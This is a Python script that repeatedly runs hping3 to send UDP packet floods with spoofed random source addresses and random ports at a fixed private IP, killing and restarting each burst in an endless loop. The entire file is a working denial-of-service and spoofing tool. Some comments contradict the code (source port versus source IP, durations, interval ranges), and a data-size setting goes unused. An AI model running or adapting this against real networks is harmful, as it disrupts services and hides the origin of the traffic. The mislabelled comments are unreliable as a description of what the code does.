#!/usr/bin/env python3
import subprocess
import random
import time
import os

# Target IP address
TARGET_IP = "10.45.0.1"

def randomize_ip():
    # Generate a random IP address in the range
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Function to run hping3 with specified parameters
def run_hping3(port, data_size, interval):
    cmd = [
        "hping3",
        "-2",              # UDP mode
        "-p", str(port),   # Port number
        # "--data", str(data_size),  # Data size
        TARGET_IP,         # Target IP
        "-i", f"u{interval}",       # Inter-packet interval in microseconds
        "-a" , str(randomize_ip()),  # Randomize source port
        "-c", str(random.randint(100,500))  # Number of packets to send
    ]
    print(f"Running: {' '.join(cmd)}")
    
    # Run hping3 in the background
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return process

# Main loop
try:
    while True:
        # Set port as a variable (random between 50 and 65535)
        port = random.randint(50, 65535)
        
        # Set data size as a variable (random between 100 and 1500 bytes)
        data_size = random.randint(100, 1500)
        
        # Set inter-packet interval (random between 2000 and 5000 microseconds)
        interval = random.randint(200, 500)
        
        # Run hping3
        process = run_hping3(port, data_size, interval)
        
        # Run for 10 seconds
        time.sleep(1)
        
        # Terminate the hping3 process
        process.terminate()
        try:
            process.wait(timeout=1)  # Wait briefly for clean exit
        except subprocess.TimeoutExpired:
            process.kill()  # Force kill if it doesn't exit
        
        # Short pause before next iteration
        time.sleep(1)

except KeyboardInterrupt:
    print("\nStopped by user.")
except Exception as e:
    print(f"Error: {e}")